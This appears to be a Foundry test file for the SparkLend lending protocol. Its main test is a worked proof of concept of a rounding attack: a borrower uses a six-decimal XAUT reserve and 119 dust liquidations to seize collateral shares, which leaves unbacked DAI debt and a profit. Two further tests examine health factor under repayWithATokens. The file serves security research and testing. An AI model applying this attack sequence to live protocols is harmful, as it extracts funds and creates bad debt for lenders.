// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.0;

import { IERC20 }    from "../../lib/erc20-helpers/src/interfaces/IERC20.sol";
import { MockERC20 } from "../../lib/erc20-helpers/src/MockERC20.sol";

import { IReserveInterestRateStrategy } from "../../lib/sparklend-v1-core/contracts/interfaces/IReserveInterestRateStrategy.sol";

import { AToken } from "../../lib/sparklend-v1-core/contracts/protocol/tokenization/AToken.sol";

import { VariableBorrowInterestRateStrategy } from "../../lib/sparklend-advanced/src/VariableBorrowInterestRateStrategy.sol";

import { SparkLendTestBase } from "../SparkLendTestBase.sol";

import { MockPoolRounding } from "./wrappers/MockPoolRounding.sol";

contract DustLiquidationRoundingAttack is SparkLendTestBase {

    uint256 constant RAY = 1e27;

    address liquidityProvider = makeAddr("liquidityProvider");
    address borrower          = makeAddr("borrower");
    address liquidator        = makeAddr("liquidator");

    MockPoolRounding mockPool;

    MockERC20 xaut;  // six-decimal XAUT stand-in
    MockERC20 dai;   // 18-decimal debt asset
    MockERC20 weth;  // 18-decimal temporary collateral

    AToken aXaut;

    function setUp() public override {
        super.setUp();

        MockPoolRounding impl = new MockPoolRounding(poolAddressesProvider);
        impl.initialize(poolAddressesProvider);

        vm.prank(admin);
        poolAddressesProvider.setPoolImpl(address(impl));

        mockPool = MockPoolRounding(address(pool));

        dai  = borrowAsset;
        weth = collateralAsset;

        // Fresh six-decimal XAUT reserve at $5,000.
        IReserveInterestRateStrategy strategy = IReserveInterestRateStrategy(
            new VariableBorrowInterestRateStrategy({
                provider:               poolAddressesProvider,
                optimalUsageRatio:      OPTIMAL_RATIO,
                baseVariableBorrowRate: BASE_RATE,
                variableRateSlope1:     SLOPE1,
                variableRateSlope2:     SLOPE2
            })
        );

        xaut = new MockERC20("XAU Tether", "XAUT", 6);
        _initReserve(IERC20(address(xaut)), strategy);
        _setUpMockOracle(address(xaut), int256(5000e8));

        aXaut = AToken(_getAToken(address(xaut)));

        _initCollateral(address(xaut), 80_00, 85_00, 105_00);
        _initCollateral(address(weth), 80_00, 85_00, 105_00);
        _initCollateral(address(dai),  80_00, 85_00, 105_00);

        vm.startPrank(admin);
        poolConfigurator.setReserveBorrowing(address(xaut), true);
        poolConfigurator.setReserveBorrowing(address(dai),  true);
        poolConfigurator.setLiquidationProtocolFee(address(xaut), 0);
        vm.stopPrank();

        vm.label(address(xaut), "XAUT");
        vm.label(address(dai),  "DAI");
        vm.label(address(weth), "WETH");

        // Fund the liquidator.
        deal(address(dai), liquidator, 0.005e18 * 119);  // $0.005 of DAI == value of one XAUT atom

        vm.prank(liquidator);
        dai.approve(address(pool), type(uint256).max);
    }

    // Pin XAUT to a 2.1 RAY liquidity index and all debt indexes to 1 RAY.
    function _setIndexes() internal {
        vm.startPrank(admin);
        mockPool.setReserveIndexes(address(xaut), uint128(RAY * 21 / 10), uint128(RAY));
        mockPool.setReserveIndexes(address(dai),  uint128(RAY),           uint128(RAY));
        vm.stopPrank();
    }

    function test_xautRounding_createsBadDebtWithOneRepaymentAndRoundedLiquidations() public {
        // Setup
        uint256 xautSeed       = 252;
        uint256 initialShares  = 120;
        uint256 daiBorrow      = 1.06599999e18;
        uint256 oneAtomPayment = 0.005e18;  // $0.005 of DAI == value of one XAUT atom

        IERC20 variableDebtDai  = IERC20(pool.getReserveData(address(dai)).variableDebtTokenAddress);
        IERC20 variableDebtXaut = IERC20(pool.getReserveData(address(xaut)).variableDebtTokenAddress);

        _setIndexes();

        _supply(liquidityProvider, address(dai), 2e18);

        // Step 1: Supply 252 XAUT atoms.
        _supply(borrower, address(xaut), xautSeed);

        // Step 2: Supply temporary WETH worth $0.08.
        uint256 wethPrice = aaveOracle.getAssetPrice(address(weth));
        uint256 wethSeed  = (8_000_000 * 1e18 + wethPrice - 1) / wethPrice;  // ceil($0.08 / price)
        _supply(borrower, address(weth), wethSeed);

        assertEq(aXaut.scaledBalanceOf(borrower), initialShares);
        assertEq(aXaut.balanceOf(borrower),       252);

        // Step 3: Borrow one XAUT atom and $1.06599999 of DAI.
        _borrow(borrower, address(xaut), 1);
        _borrow(borrower, address(dai),  daiBorrow);

        // Step 4: Withdraw temporary WETH.
        _withdraw(borrower, address(weth), type(uint256).max);

        // Step 5: Repay one XAUT atom with aTokens.
        assertEq(aXaut.scaledBalanceOf(borrower),      initialShares);
        assertEq(aXaut.balanceOf(borrower),            252);
        assertEq(variableDebtDai.balanceOf(borrower),  daiBorrow);
        assertEq(variableDebtXaut.balanceOf(borrower), 1);

        ( , , , , , uint256 healthFactorBeforeRepay ) = pool.getUserAccountData(borrower);
        assertEq(healthFactorBeforeRepay, 1.000000009337068248e18);

        vm.prank(borrower);
        pool.repayWithATokens(address(xaut), 1, 2);

        assertEq(aXaut.scaledBalanceOf(borrower),      initialShares - 1);  // 119 scaled shares
        assertEq(aXaut.balanceOf(borrower),            249);
        assertEq(variableDebtDai.balanceOf(borrower),  daiBorrow);
        assertEq(variableDebtXaut.balanceOf(borrower), 0);

        ( , , , , , uint256 healthFactorAfterRepay ) = pool.getUserAccountData(borrower);
        assertEq(healthFactorAfterRepay, 0.992729840457127959e18);

        // Step 6: Liquidate the borrower.
        vm.prank(liquidator);
        pool.liquidationCall(address(xaut), address(dai), borrower, oneAtomPayment, true);

        // Repay burned share 120->119; first liquidation seized share 119->118.
        assertEq(aXaut.scaledBalanceOf(borrower),   118);
        assertEq(aXaut.balanceOf(borrower),         247);
        assertEq(aXaut.scaledBalanceOf(liquidator), 1);
        assertEq(aXaut.balanceOf(liquidator),       2);

        ( , , , , , uint256 healthFactor ) = pool.getUserAccountData(borrower);
        assertEq(healthFactor, 0.989396804801100894e18);

        // Remaining 118 tiny liquidations, each seizing one whole scaled share for one atom.
        for (uint256 i = 1; i < 119; i++) {
            vm.prank(liquidator);
            pool.liquidationCall(address(xaut), address(dai), borrower, oneAtomPayment, true);
        }

        assertEq(aXaut.scaledBalanceOf(borrower),   0);
        assertEq(aXaut.balanceOf(borrower),         0);
        assertEq(aXaut.scaledBalanceOf(liquidator), 119);
        assertEq(aXaut.balanceOf(liquidator),       249);

        // The borrower is left with unbacked DAI debt: 1.06599999 - 119 * 0.005 = 0.47099999.
        assertEq(variableDebtDai.balanceOf(borrower), 0.47099999e18);

        // Liquidator redeems the seized collateral: floor(119 * 2.1) = 249 XAUT atoms.
        _withdraw(liquidator, address(xaut), type(uint256).max);
        assertEq(xaut.balanceOf(liquidator), 249);

        // Net extraction (value per atom == $0.005): borrowed DAI - liquidation payments
        //   + redeemed atoms - initial seed = $0.46099999.
        uint256 finalXautAtoms = 250;  // 1 borrowed atom kept + 249 redeemed
        uint256 profit =
            (daiBorrow + finalXautAtoms * oneAtomPayment)
            - (oneAtomPayment * 119 + xautSeed * oneAtomPayment);

        assertEq(profit, 0.46099999e18);
    }

    /**********************************************************************************************/
    /*** `repayWithATokens` partial repayment while unhealthy                                   ***/
    /**********************************************************************************************/

    // Seeds a borrower with $1500 of WETH and $200 of XAUT collateral against $900 of DAI and $200
    // of XAUT debt, then reprices WETH to push the borrower underwater. When `xautAsCollateral` is
    // false the borrower opts XAUT out of collateral BEFORE the reprice, because
    // `setUserUseReserveAsCollateral` validates the resulting health factor itself.
    function _setUpUnhealthyBorrower(uint256 wethPrice, bool xautAsCollateral) internal {
        _supply(liquidityProvider, address(dai),  2000e18);
        _supply(liquidityProvider, address(xaut), 100_000);

        _supply(borrower, address(weth), 1500e18);  // $1500
        _supply(borrower, address(xaut), 40_000);   // $200

        _borrow(borrower, address(xaut), 40_000);   // $200
        _borrow(borrower, address(dai),  900e18);   // $900

        assertEq(_healthFactor(borrower), 1.313636363636363636e18);

        if (!xautAsCollateral) {
            vm.prank(borrower);
            pool.setUserUseReserveAsCollateral(address(xaut), false);
        }

        _setUpMockOracle(address(weth), int256(wethPrice));
    }

    function _totalCollateralBase(address user) internal view returns (uint256 totalCollateralBase) {
        ( totalCollateralBase, , , , , ) = pool.getUserAccountData(user);
    }

    function _totalDebtBase(address user) internal view returns (uint256 totalDebtBase) {
        ( , totalDebtBase, , , , ) = pool.getUserAccountData(user);
    }

    function _healthFactor(address user) internal view returns (uint256 healthFactor) {
        ( , , , , , healthFactor ) = pool.getUserAccountData(user);
    }

    // The borrower's XAUT aTokens are collateral, so `repayWithATokens` on XAUT improves the health
    // factor (HF > liquidation threshold of the repaid asset) but cannot reach 1e18 even when the
    // whole XAUT debt is repaid.
    function test_repayWithATokens_partialRepayLeavesHealthFactorBelowOne_possible() public {
        _setUpUnhealthyBorrower(0.7e8, true);  // WETH: $1.00 -> $0.70, so $1500 -> $1050 of collateral

        IERC20 variableDebtXaut = IERC20(pool.getReserveData(address(xaut)).variableDebtTokenAddress);

        // Weighted collateral $1062.50 ($1250 * 85%), total debt $1100.
        assertEq(_healthFactor(borrower), 0.965909090909090909e18);

        // Partial repay of half the XAUT debt using the borrower's own aXAUT.
        vm.prank(borrower);
        pool.repayWithATokens(address(xaut), 20_000, 2);

        assertEq(variableDebtXaut.balanceOf(borrower), 20_000);
        assertEq(aXaut.balanceOf(borrower),            20_000);

        // Health factor improved but is still below 1: a partial repay is possible.
        assertEq(_healthFactor(borrower), 0.977500000000000000e18);
        assertLt(_healthFactor(borrower), 1e18);

        // Repaying the ENTIRE remaining XAUT debt with aTokens still cannot reach 1e18, so there is
        // no `repayWithATokens` amount this borrower could use under a `HF >= 1e18` repay check.
        vm.prank(borrower);
        pool.repayWithATokens(address(xaut), 20_000, 2);

        assertEq(variableDebtXaut.balanceOf(borrower), 0);
        assertEq(aXaut.balanceOf(borrower),            0);

        assertEq(_healthFactor(borrower), 0.991666666666666667e18);
        assertLt(_healthFactor(borrower), 1e18);
    }

    // Strongest case: the repaid asset is NOT enabled as collateral for the borrower, so burning the
    // aTokens removes zero counted collateral. The repayment can only reduce debt, so the health
    // factor strictly increases with no rounding-loss surface at all.
    function test_repayWithATokens_nonCollateralATokensStrictlyImproveHealthFactor() public {
        _setUpUnhealthyBorrower(0.55e8, false);  // WETH: $1.00 -> $0.55, so $1500 -> $825 of collateral

        IERC20 variableDebtXaut = IERC20(pool.getReserveData(address(xaut)).variableDebtTokenAddress);

        assertEq(_totalCollateralBase(borrower), 825e8);   // WETH only, XAUT is not counted
        assertEq(_totalDebtBase(borrower),       1100e8);  // $900 DAI + $200 XAUT
        assertEq(_healthFactor(borrower),        0.637500000000000000e18);

        vm.prank(borrower);
        pool.repayWithATokens(address(xaut), 40_000, 2);

        assertEq(variableDebtXaut.balanceOf(borrower), 0);
        assertEq(aXaut.balanceOf(borrower),            0);

        // Counted collateral is untouched, debt fell by $200, health factor strictly improved.
        assertEq(_totalCollateralBase(borrower), 825e8);
        assertEq(_totalDebtBase(borrower),       900e8);
        assertEq(_healthFactor(borrower),        0.779166666666666667e18);
        assertLt(_healthFactor(borrower),        1e18);
    }

}
